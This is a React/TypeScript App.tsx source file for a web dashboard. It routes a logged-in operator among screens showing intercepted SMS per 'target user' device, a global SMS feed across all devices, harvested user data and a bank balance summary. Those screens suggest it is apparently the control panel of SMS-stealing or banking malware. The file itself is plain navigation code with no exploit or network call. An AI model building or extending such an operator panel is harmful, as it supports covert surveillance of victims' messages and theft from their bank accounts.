import React, { useState } from 'react';
import Login from './components/Login';
import Home from './components/Home';
import SmsViewer from './components/Dashboard'; 
import UserDataViewer from './components/UserDataViewer';
import GlobalDataViewer from './components/GlobalDataViewer';
import Notifications from './components/Notifications';
import FavoritesList from './components/FavoritesList';
import MessagesViewer from './components/MessagesViewer';
import BankBalanceSummary from './components/BankBalanceSummary';
import { User, AppState, DeviceInfo, Screen } from './types';
import { logoutUser, markUserAsChecked } from './services/firebase';

const App: React.FC = () => {
  const [appState, setAppState] = useState<AppState>({
    user: null,
    currentScreen: 'LOGIN',
    selectedTargetUser: null
  });

  const handleLoginSuccess = (user: User) => {
    setAppState(prev => ({ ...prev, user, currentScreen: 'HOME' }));
  };

  const handleLogout = () => {
    logoutUser();
    window.location.reload();
  };

  const handleSelectUserForSMS = (device: DeviceInfo) => {
    markUserAsChecked(device.userId);
    setAppState(prev => ({ ...prev, selectedTargetUser: device, currentScreen: 'SMS_VIEW' }));
  };

  const handleSelectUserForData = (device: DeviceInfo) => {
    markUserAsChecked(device.userId);
    setAppState(prev => ({ ...prev, selectedTargetUser: device, currentScreen: 'DATA_VIEW' }));
  };

  const navigateTo = (screen: Screen) => {
    setAppState(prev => ({ ...prev, currentScreen: screen, selectedTargetUser: null }));
  };

  const handleBackToHome = () => {
    setAppState(prev => ({ ...prev, selectedTargetUser: null, currentScreen: 'HOME' }));
  };

  if (appState.currentScreen === 'LOGIN') {
    return <Login onLoginSuccess={handleLoginSuccess} />;
  }

  const renderOtherScreens = () => {
    switch (appState.currentScreen) {
      case 'SMS_VIEW':
        return appState.selectedTargetUser ? (
          <SmsViewer targetUser={appState.selectedTargetUser} onBack={handleBackToHome} />
        ) : null;
      case 'GLOBAL_SMS':
        return <SmsViewer targetUser={null} onBack={handleBackToHome} />;
      case 'DATA_VIEW':
        return appState.selectedTargetUser ? (
          <UserDataViewer targetUser={appState.selectedTargetUser} onBack={handleBackToHome} />
        ) : null;
      case 'GLOBAL_DATA':
        return <GlobalDataViewer onBack={handleBackToHome} />;
      case 'NOTIFICATIONS':
        return <Notifications onBack={handleBackToHome} />;
      case 'FAVORITES':
        return (
          <FavoritesList 
            onBack={handleBackToHome} 
            onSelectUserForSMS={handleSelectUserForSMS}
            onSelectUserForData={handleSelectUserForData}
          />
        );
      case 'BANK_SUMMARY':
        return <BankBalanceSummary onBack={handleBackToHome} />;
      case 'MESSAGES':
        return <MessagesViewer onBack={handleBackToHome} />;
      default:
        return null;
    }
  };

  return (
    <div className="h-full w-full relative">
      {/* Home screen preservation: keep mounted but hide with CSS when other screens are active */}
      <div className={appState.currentScreen === 'HOME' ? "h-full w-full" : "hidden"}>
        <Home 
          onSelectUserForSMS={handleSelectUserForSMS}
          onSelectUserForData={handleSelectUserForData}
          onGlobalSMS={() => navigateTo('GLOBAL_SMS')}
          onGlobalData={() => navigateTo('GLOBAL_DATA')}
          onLogout={handleLogout}
          onOpenNotifications={() => navigateTo('NOTIFICATIONS')}
          onOpenFavorites={() => navigateTo('FAVORITES')}
          onNav={((id: string) => {
              if (id === 'MESSAGES') navigateTo('MESSAGES');
              else if (id === 'BANK_SUM') navigateTo('BANK_SUMMARY');
              else if (id === 'GLOBAL_SMS') navigateTo('GLOBAL_SMS');
              else if (id === 'GLOBAL_DATA') navigateTo('GLOBAL_DATA');
              else if (id === 'HOME') navigateTo('HOME');
          }) as any}
          user={appState.user}
        />
      </div>

      {/* Render stack of other screens over Home */}
      {appState.currentScreen !== 'HOME' && (
        <div className="h-full w-full absolute inset-0 z-40 bg-gray-50 animate-fadeIn">
          {renderOtherScreens()}
        </div>
      )}
    </div>
  );
};

export default App;